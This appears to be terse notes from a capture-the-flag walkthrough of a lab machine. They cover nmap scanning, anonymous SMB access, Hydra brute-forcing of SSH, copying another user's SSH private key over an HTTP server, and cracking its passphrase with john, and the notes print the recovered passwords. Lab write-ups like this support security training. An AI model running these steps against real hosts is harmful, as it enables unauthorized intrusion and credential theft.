sudo nmap -sS 10.10.85.112
sudo nmap -A 10.10.85.112

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7

#smb is working on the port on 139 and 445

smbmap -H 10.10.85.112

[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.85.112...
[+] IP: 10.10.85.112:445	Name: 10.10.85.112                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	Anonymous                                         	READ ONLY
	IPC$                                              	NO ACCESS

#Anonymous login found

smbclient 10.10.85.112

Unable to initialize messaging context
Enter WORKGROUP\dragon's password:<Anonymous> 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 23:01:20 2018
  ..                                  D        0  Thu Apr 19 22:43:06 2018
  staff.txt                           N      173  Thu Apr 19 22:59:55 2018

		14318640 blocks of size 1024. 11094800 blocks available
smb: \> get staff.txt #get the staff file 
getting file \staff.txt of size 173 as staff.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
 

cat staff.txt

Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay


#two name found jan and kay try both to find the valid username in question 5
#valid username is jan 
#username found
#username:jan

Hydra to bruteforce password

hydra -l jan -P rockyou.txt <ip> ssh -V
#password found
#password:armando

ssh jan@10.10.85.112
password:armando

cd /home/ && ls
#otheruser found is kay


cd /home/kay/

#passphrase beeswax
#go to home/kay
cd /home/kay
#we can see the .ssh folder 
#and get the authorized keys, id_rsa, id_rsa.pub
cd /home/kay/.ssh
#start http server on the victim
python3 -m http.server 8000

#get the id_rsa file from the victim
wget http://ip:port/id_rsa

#use ssh2john.py to get hash from id_rsa to id_rsa.hash 
#wget https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
python ssh2john.py id_rsa > id_rsa.hash

#configure the john using below link
#https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU
cd ~/src/john/run
./john --wordlist=/path to wordlist/ id_rsa.hash

#now you get the passpharase as beeswax
passphrase: beeswax

#now change the mode of the private key (id_rsa)
chmod 400 id_rsa
ssh -i id_rsa kay@ip
#yes you login to the kay user 
cat pass.bak

heresareallystrongpasswordthatfollowsthepasswordpolicy$$



